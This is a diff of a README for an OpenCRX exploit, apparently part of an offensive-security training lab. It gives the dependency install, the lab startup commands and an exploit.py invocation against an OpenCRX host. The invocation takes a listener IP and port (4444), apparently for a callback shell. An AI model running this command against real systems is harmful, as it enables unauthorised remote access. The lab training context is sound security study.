@@ -1,5 +1,21 @@
-Run server
+# OpenCRX
 
-`pip install jaydebeapi`
+Before running the exploit, you need to install `jaydebeapi` to work with HSQLDB.
+```bash
+pip install jaydebeapi
+```
 
-Known bugs?
+Then, you can run the exploit
+```bash
+python3 exploit.py -t https://opencrx:8000 -l 192.168.45.243 -p 4444
+```
+![OpenCRX](/.images/apigateway.png)
+
+> [!WARNING]
+> Remember to start the lab before running the exploit:
+> ```bash
+> ssh student@opencrx
+> cd crx/apache-tomee-plus-7.0.5/bin
+> ./opencrx.sh run
+> ```
+
